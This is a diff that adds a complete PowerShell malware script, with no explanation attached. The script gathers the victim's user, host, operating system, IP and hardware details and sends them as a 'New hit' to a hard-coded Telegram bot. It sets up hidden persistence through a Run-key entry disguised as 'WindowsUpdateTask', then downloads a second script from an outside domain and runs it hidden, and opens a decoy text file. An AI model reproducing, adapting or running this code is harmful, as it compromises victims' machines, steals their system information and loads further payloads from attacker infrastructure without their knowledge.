@@ -1,0 +1,127 @@
+$group = "DefaultGroup"
+
+function Write-Log {
+    param(
+        [string]$Message,
+        [string]$Level = "INFO"
+    )
+    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
+    $logMessage = "[$timestamp] [$Level] $Message"
+    Write-Host $logMessage
+}
+
+function Send-TelegramNotify {
+    try {
+        $username = $env:USERNAME
+        $computerName = $env:COMPUTERNAME
+        $cpu = try { (Get-CimInstance Win32_Processor).Name.Trim() } catch { "Unknown" }
+        $gpu = try { (Get-CimInstance Win32_VideoController | Select-Object -First 1).Name.Trim() } catch { "Unknown" }
+        $ram = try {
+            $totalBytes = (Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory
+            "{0:N2} GB" -f ($totalBytes / 1GB)
+        } catch { "Unknown" }
+      
+        $ip = try {
+            (Invoke-RestMethod -Uri "https://api.ipify.org/?format=json" -TimeoutSec 5).ip
+        } catch {
+            try {
+                (Get-NetIPAddress | Where-Object { $_.AddressFamily -eq 'IPv4' -and $_.PrefixOrigin -eq 'Dhcp' } | Select-Object -First 1).IPAddress
+            } catch { "Unknown" }
+        }
+      
+        $os = [System.Environment]::OSVersion.VersionString
+      
+        $msg = @"
+[+] New hit
+User: $username
+Host: $computerName
+OS: $os
+IP: $ip
+CPU: $cpu
+GPU: $gpu
+RAM: $ram
+Group: $group
+Timestamp: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')
+"@
+      
+        $bot = "7252153973:AAHhnvXQn4Q5DJTEtLiA7y59VCkJEdEFoak"
+        $chat = "-1002513798195"
+        $uri = "https://api.telegram.org/bot$bot/sendMessage"
+        $body = @{
+            chat_id = $chat
+            text = $msg
+            disable_notification = $true
+        }
+      
+        Invoke-RestMethod -Uri $uri -Method Post -Body $body -TimeoutSec 10 | Out-Null
+    } catch {}
+}
+
+function Add-Persistence {
+    param(
+        [string]$ScriptName = "tt9.ps1"
+    )
+  
+    try {
+        $targetPath = Join-Path $env:USERPROFILE $ScriptName
+
+        $scriptContent = $null
+
+        if ($PSCommandPath -and (Test-Path $PSCommandPath -PathType Leaf)) {
+            $scriptContent = Get-Content -Path $PSCommandPath -Raw -Encoding UTF8
+        }
+        elseif ($MyInvocation.MyCommand.Path -and (Test-Path $MyInvocation.MyCommand.Path -PathType Leaf)) {
+            $scriptContent = Get-Content -Path $MyInvocation.MyCommand.Path -Raw -Encoding UTF8
+        }
+        else {
+            $scriptContent = $MyInvocation.MyCommand.ScriptBlock.ToString()
+        }
+
+        if ($scriptContent) {
+            Set-Content -Path $targetPath -Value $scriptContent -Encoding UTF8 -Force
+        }
+
+        $psCommand = "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$targetPath`""
+      
+        $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
+        $regName = "WindowsUpdateTask"
+      
+        if (-not (Test-Path $regPath)) {
+            New-Item -Path $regPath -Force | Out-Null
+        }
+      
+        Set-ItemProperty -Path $regPath -Name $regName -Value $psCommand -Type String -Force
+        return $true
+    } catch {
+        return $false
+    }
+}
+
+Send-TelegramNotify
+Add-Persistence -ScriptName "tt9.ps1"
+
+$tempPath = Join-Path $env:TEMP "see9.ps1"
+try {
+    Invoke-WebRequest -Uri "https://bvmatqnam.com.vn/js/test/see9.ps1" -OutFile $tempPath -TimeoutSec 15
+    Start-Process powershell -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$tempPath`"" -WindowStyle Hidden
+} catch {}
+
+
+# Define the URL and the local path where the file will be saved
+$url = "https://bvmatqnam.com.vn/js/test/21.txt"
+$outputPath = Join-Path $env:TEMP "21.txt"   # Saves to the current user's Temp folder
+
+try {
+    # Download the file ( -UseBasicParsing makes it compatible with older PowerShell versions )
+    Invoke-WebRequest -Uri $url -OutFile $outputPath -UseBasicParsing -ErrorAction Stop
+    Write-Host "Download completed: $outputPath"
+
+    # Open the downloaded file with Notepad
+    Start-Process -FilePath "notepad.exe" -ArgumentList "`"$outputPath`"" -Wait
+}
+catch {
+    Write-Error "Failed to download or open the file: $_"
+}
+
+
+
